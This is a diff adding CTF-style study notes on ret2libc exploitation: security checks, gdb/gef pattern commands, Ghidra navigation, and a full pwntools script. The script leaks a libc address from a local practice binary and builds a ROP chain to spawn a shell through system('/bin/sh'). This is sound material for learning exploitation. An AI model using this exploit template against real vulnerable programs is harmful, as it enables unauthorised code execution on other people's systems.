@@ -1,0 +1,65 @@
+### ret2libc ###
+
+## check
+checksec bin								# check security of binary
+ldd bin									# check linked library
+cat /proc/sys/kernel/randomize_va_space					# 2 => full random
+									# 0 => desactivate
+
+Global Offset Table (GOT)
+The global offset table is a section inside a program that holds addresses of dynamically linked functions.
+
+
+## gdb + gef
+gef> pattern create
+gef> pattern search $rsp						# after segmentation fault (x64)
+gef> pattern search $rip						# (x32)
+
+
+## ghidra
+Program Trees -> bin -> .got.plt					# on left, check addr from one libc function
+Program Trees -> bin -> .plt						# on left, check addr from puts function
+
+
+## exploit example
+#!/usr/bin/env python3
+from pwn import *
+
+# set up context
+context.binary = binary = './exploit_me'
+
+elf = ELF(binary)
+rop = ROP(elf)
+
+# assign the full path of libc (ldd binary)
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+
+# spawn binary into new process. (no binary specified because of context setup)
+p = process()
+
+padding = b'A'*18 # found with created pattern and pattern search after segfault
+payload = padding
+payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0]) # pop rdi register for our argument
+payload += p64(elf.got.gets) # fill rdi with addr of gets function
+payload += p64(elf.plt.puts) # exec puts with loaded argument
+payload += p64(elf.symbols.main) # ret to main program
+
+p.recvline()
+p.sendline(payload) # send payload
+p.recvline()
+leak = u64(p.recvline().strip().ljust(8,b'\0'))
+p.recvline()
+
+log.info(f'Gets leak => {hex(leak)}') # leaked addr
+libc.address = leak - libc.symbols.gets # base libc = leak - libc.symbols.gets
+log.info(f'Libc base => {hex(libc.address)}')
+
+payload = padding
+payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0]) # pop rdi register for our argument
+payload += p64(next(libc.search(b'/bin/sh'))) # fill rdi with addr of "/bin/sh" string inside libc
+payload += p64(rop.find_gadget(['ret'])[0]) # ret instruction for stack align
+payload += p64(libc.symbols.system) # exec system
+
+p.sendline(payload)
+p.recvline()
+p.interactive()
